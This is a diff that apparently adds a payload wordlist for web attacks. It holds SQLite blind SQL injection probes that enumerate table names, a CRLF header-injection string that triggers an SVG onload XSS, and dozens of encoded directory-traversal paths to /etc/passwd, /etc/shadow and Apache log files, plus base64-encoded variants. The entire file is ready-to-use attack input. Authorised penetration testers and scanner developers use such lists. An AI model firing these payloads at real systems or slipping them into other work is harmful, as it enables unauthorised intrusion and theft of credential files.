@@ -1,0 +1,100 @@
+SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
+SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
+and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
+and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
+and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
+%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
+x23
+x27
+x3D%20\x3B
+x3D%20\x27
+..2fapache2flogs2ferror.log
+..2fapache2flogs2faccess.log
+..2f..2fapache2flogs2ferror.log
+..2f..2fapache2flogs2faccess.log
+..2f..2f..2fapache2flogs2ferror.log
+..2f..2f..2fapache2flogs2faccess.log
+..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces_log
+..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces.log
+..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror_log
+..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror.log
+..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess_log
+..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess.log
+..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess_ log
+..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess. log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess.log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess.log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess.log
+..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror_log
+..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror.log
+..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror_l og
+..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror.l og
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror.log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror.log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror_log
+..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror.log
+..2fetc2fpasswd
+..2fetc2fpasswd%00
+..2f..2fetc2fpasswd
+..2f..2fetc2fpasswd%00
+..2f..2f..2fetc2fpasswd
+..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
+..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fshadow%00
+L2V0Yy9tYXN0ZXIucGFzc3dk
+L21hc3Rlci5wYXNzd2Q=
+ZXRjL3Bhc3N3ZA==
+ZXRjL3NoYWRvdyUwMA==
+L2V0Yy9wYXNzd2Q=
+L2V0Yy9wYXNzd2QlMDA=
+Li4vZXRjL3Bhc3N3ZA==
+Li4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
+Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
